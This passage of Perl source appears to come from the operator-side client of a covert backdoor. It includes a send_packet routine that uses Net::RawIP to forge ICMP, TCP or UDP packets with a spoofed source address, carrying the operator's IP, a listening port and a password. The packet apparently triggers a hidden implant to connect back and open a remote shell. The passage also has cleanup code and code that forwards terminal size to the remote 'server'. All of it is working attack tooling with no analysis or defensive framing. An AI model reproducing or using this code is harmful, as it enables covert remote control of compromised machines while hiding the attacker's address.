        my $line = $SHELL_HIST{$c};
        $shown_lines += scalar(split(/\n/, $line));
        push(@screen, $line);

        $c--;
     }

     clear();
     out(reverse(@screen));

   }

   sub send_packet {
     my $packet;

     if (lc($protocol) eq "icmp") {
       $packet = new Net::RawIP({  ip => { saddr => $source_ip,
                                           daddr => $dest },
                                 icmp => {  data => ":$my_ip:$lport:$password" }});
     } else  {
       $packet = new Net::RawIP({ip =>  { saddr => $source_ip,
                                          daddr => $dest },
                      lc($protocol) => { source => "$source_port",
                                           dest => "$dest_port",
                                           data => ":$my_ip:$lport:$password"}});
     }

     $packet->send;
   }


   #  safely exit
   sub finish {
     my ($msg1,$msg2) = @_;

     if ($msg1 eq "INT") {
       undef($msg1);
       return(undef) if ($menu_act == 1);
     }

     out($msg1) if ($msg1);

     $sock->close()       if (defined($sock));
     $bind->close()       if (defined($bind));
     $proto_sock->close() if (defined($proto_sock));
     ReadMode 0;
     sleep(1);
     out($msg2) if ($msg2);
     exit(0);
   }

   # It tells the server that the terminal size has changed
   sub winch {
     @term_size = GetTerminalSize(\*STDIN);
     spm("TERM_SIZE @term_size") if (defined(@term_size));
     $clear = `clear`;
   }

